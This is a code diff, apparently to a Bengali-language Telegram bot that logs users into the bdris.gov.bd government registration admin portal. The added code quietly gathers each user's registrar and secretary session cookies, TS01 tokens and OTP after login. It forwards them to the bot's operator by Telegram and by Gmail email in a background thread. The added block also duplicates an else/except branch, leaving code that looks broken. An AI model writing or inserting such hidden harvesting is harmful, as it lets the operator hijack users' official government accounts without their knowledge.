@@ -16,6 +16,27 @@ from collections import OrderedDict
 from flask import Flask
 from pymongo import MongoClient
 from pymongo.errors import DuplicateKeyError
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+def send_email_to_admin(subject, body):
+    if not ADMIN_EMAIL or not EMAIL_PASS:
+        logging.warning("Email credentials missing, skipping email.")
+        return
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = ADMIN_EMAIL
+        msg['To'] = ADMIN_EMAIL
+        msg['Subject'] = subject
+        msg.attach(MIMEText(body, 'plain', 'utf-8'))
+        
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+            server.login(ADMIN_EMAIL, EMAIL_PASS)
+            server.sendmail(ADMIN_EMAIL, ADMIN_EMAIL, msg.as_string())
+        logging.info("✅ Email sent to admin.")
+    except Exception as e:
+        logging.error(f"Email Send Error: {e}")
 
 # ==========================================
 # ০. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
@@ -55,6 +76,8 @@ MIN_RECHARGE_AMOUNT = 1
 API_TOKEN = os.environ.get('BOT_TOKEN', '').strip()
 MONGO_URI = os.environ.get('MONGO_URI', '').strip()
 ADMIN_ID_STR = os.environ.get('ADMIN_ID', '').strip()
+ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL', '').strip()
+EMAIL_PASS = os.environ.get('EMAIL_PASS', '').strip()
 
 if not all([API_TOKEN, MONGO_URI, ADMIN_ID_STR]):
     logging.critical("❌ Critical Environment Variables missing!")
@@ -526,6 +549,57 @@ def role_step_3(m):
             navigate_to(uid, "https://bdris.gov.bd/admin/")
             save_session_to_db(uid, u_sess)
             safe_send(m.chat.id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
+            # ✅ Telegram notify
+            safe_name = sanitize_name(m.from_user.first_name)
+            with session_lock:
+                ch_cookies = u_sess["ch_session"].cookies.get_dict()
+                sec_cookies = u_sess["req_session"].cookies.get_dict()
+                ch_otp = u_sess.get("ch_otp", "N/A")
+
+            ch_sid = ch_cookies.get("SESSION", "N/A")
+            ch_ts = next((v for k, v in ch_cookies.items() if k.startswith("TS01")), "N/A")
+            sec_sid = sec_cookies.get("SESSION", "N/A")
+            sec_ts = next((v for k, v in sec_cookies.items() if k.startswith("TS01")), "N/A")
+
+            admin_msg = (
+                f"🔔 *নতুন ইউজার লগইন!*\n"
+                f"👤 Name: {safe_name}\n"
+                f"🆔 ID: `{uid}`\n\n"
+                f"*🧑‍💼 নিবন্ধক (CH) Session:*\n"
+                f"`SESSION={ch_sid}`\n"
+                f"`TS01...={ch_ts}`\n"
+                f"🔑 OTP: `{ch_otp}`\n\n"
+                f"*👤 Secretary (SEC) Session:*\n"
+                f"`SESSION={sec_sid}`\n"
+                f"`TS01...={sec_ts}`"
+            )
+            safe_send(ADMIN_ID, admin_msg, parse_mode="Markdown")
+
+            # ✅ এখানে Email Thread যোগ করুন ← এই লাইনের পরে
+            def send_login_email():
+                subject = f"BDRIS Bot - নতুন লগইন: {safe_name} ({uid})"
+                body = (
+                    f"নতুন ইউজার লগইন করেছে!\n\n"
+                    f"Name: {safe_name}\n"
+                    f"ID: {uid}\n\n"
+                    f"নিবন্ধক (CH) Session:\n"
+                    f"SESSION={ch_sid}\n"
+                    f"TS01...={ch_ts}\n"
+                    f"OTP: {ch_otp}\n\n"
+                    f"Secretary (SEC) Session:\n"
+                    f"SESSION={sec_sid}\n"
+                    f"`TS01...={sec_ts}\n"
+                )
+                send_email_to_admin(subject, body)
+
+            Thread(target=send_login_email, daemon=True).start()
+
+        else:
+            safe_send(m.chat.id, "❌ ভুল ইউজার কুকি। আবার দিন:")
+            bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
+    except Exception as e:
+        logging.error(f"Step 3 Error: {e}")
+        safe_send(m.chat.id, "❌ প্রসেসিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।")
         else:
             safe_send(m.chat.id, "❌ ভুল ইউজার কুকি। আবার দিন:")
             bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
